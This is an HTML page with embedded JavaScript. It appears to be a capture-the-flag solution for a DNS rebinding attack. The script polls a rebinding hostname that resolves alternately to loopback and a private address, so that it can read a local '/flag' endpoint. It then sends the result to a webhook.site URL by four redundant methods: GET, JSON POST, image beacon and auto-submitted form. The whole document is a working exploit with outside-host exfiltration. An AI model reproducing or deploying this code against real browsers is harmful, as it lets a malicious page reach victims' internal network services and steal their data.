<!DOCTYPE html>
<html>
<head>
    <title>DNS Rebinding Exploit</title>
</head>
<body>
    <h2>DNS Rebinding Attack in Progress...</h2>
    <div id="status">Initializing...</div>
    
    <script>
        // Configuration - USING YOUR WEBHOOK
        const WEBHOOK_BASE = 'https://webhook.site/aeb7e887-f78a-487d-bb97-52b3842d26de';
        const TARGET_URL = 'http://7f000001.c0a80001.rbndr.us/flag';
        
        let attemptCount = 0;
        const maxAttempts = 12;
        const statusEl = document.getElementById('status');
        
        function updateStatus(message) {
            statusEl.textContent = `[Attempt ${attemptCount}/${maxAttempts}] ${message}`;
            console.log(message);
        }
        
        async function fetchFlag() {
            attemptCount++;
            
            if (attemptCount > maxAttempts) {
                updateStatus('âŒ Max attempts reached. Attack failed.');
                return;
            }
            
            updateStatus(`ðŸ”„ Fetching from ${TARGET_URL}...`);
            
            try {
                const response = await fetch(TARGET_URL);
                
                if (response.ok) {
                    const flagText = await response.text();
                    
                    if (flagText && flagText.length > 0 && !flagText.includes('html')) {
                        updateStatus('âœ… SUCCESS! Flag retrieved!');
                        exfiltrateFlag(flagText);
                        return true;
                    } else {
                        updateStatus('âš ï¸ Got response but no flag found, retrying...');
                    }
                } else {
                    updateStatus(`âŒ HTTP ${response.status}, retrying...`);
                }
            } catch (error) {
                updateStatus(`ðŸ”§ Error: ${error.message}, retrying...`);
            }
            
            // Retry after 2 seconds (DNS TTL)
            setTimeout(fetchFlag, 2000);
            return false;
        }
        
        function exfiltrateFlag(flag) {
            updateStatus(`ðŸš¨ FLAG: ${flag}`);
            
            // Multiple exfiltration methods for reliability
            const exfilMethods = [
                // Method 1: Direct GET request
                () => fetch(`${WEBHOOK_BASE}?flag=${encodeURIComponent(flag)}&method=get`),
                
                // Method 2: POST request
                () => fetch(WEBHOOK_BASE, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ flag: flag, source: 'dns_rebinding' })
                }),
                
                // Method 3: Image beacon
                () => {
                    const img = new Image();
                    img.src = `${WEBHOOK_BASE}?method=img&data=${btoa(flag)}`;
                },
                
                // Method 4: Form submission
                () => {
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = WEBHOOK_BASE;
                    const input = document.createElement('input');
                    input.name = 'flag_data';
                    input.value = flag;
                    form.appendChild(input);
                    document.body.appendChild(form);
                    form.submit();
                }
            ];
            
            // Execute all exfiltration methods
            exfilMethods.forEach((method, index) => {
                setTimeout(() => {
                    try {
                        method();
                        console.log(`Exfiltration method ${index + 1} executed`);
                    } catch (e) {
                        console.log(`Exfiltration method ${index + 1} failed:`, e);
                    }
                }, index * 500);
            });
            
            // Also try to display the flag on page
            document.body.innerHTML += `<div style="background: yellow; padding: 20px; margin: 20px; border: 2px solid red;">
                <h3>ðŸŽ¯ FLAG CAPTURED:</h3>
                <pre>${flag}</pre>
            </div>`;
        }
        
        // Start the attack
        updateStatus('ðŸš€ Starting DNS Rebinding attack...');
        setTimeout(fetchFlag, 1000);
    </script>
</body>
</html>
